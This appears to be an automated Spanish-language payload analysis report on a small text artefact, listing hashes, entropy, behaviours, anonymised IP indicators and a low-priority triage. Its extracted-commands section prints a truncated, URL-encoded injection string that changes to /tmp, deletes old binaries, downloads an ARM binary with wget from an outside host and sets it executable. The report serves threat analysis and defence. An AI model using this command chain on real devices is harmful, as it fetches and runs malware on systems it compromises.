# 🧬 Payload Analysis

`9a05817e653efa272203ab8614252481bdbf819a8c3d179abd9b3ca30e652f98`

## 📌 Resumen

Artefacto de 368 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.14. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 5 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `9a05817e653efa272203ab8614252481bdbf819a8c3d179abd9b3ca30e652f98`
- **SHA1:** `5c238a88d520b3682fd63bc74a0974ae2f4c2378`
- **MD5:** `1840f083fc1c1d32fbb4258b1e6a355b`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 368 B |
| Entropía | 5.14 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
startip=1.1.1.XXX;cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 201.51.13.XXX | static_analysis |
| ip | 190.179.168.XXX | static_analysis |
| ip | 2.2.2.XXX | static_analysis |
| ip | 1.1.1.XXX | static_analysis |
| command | startip=1.1.1.XXX;cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai | strings |
| hash | 9a05817e653efa272203ab8614252481bdbf819a8c3d179abd9b3ca30e652f98 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
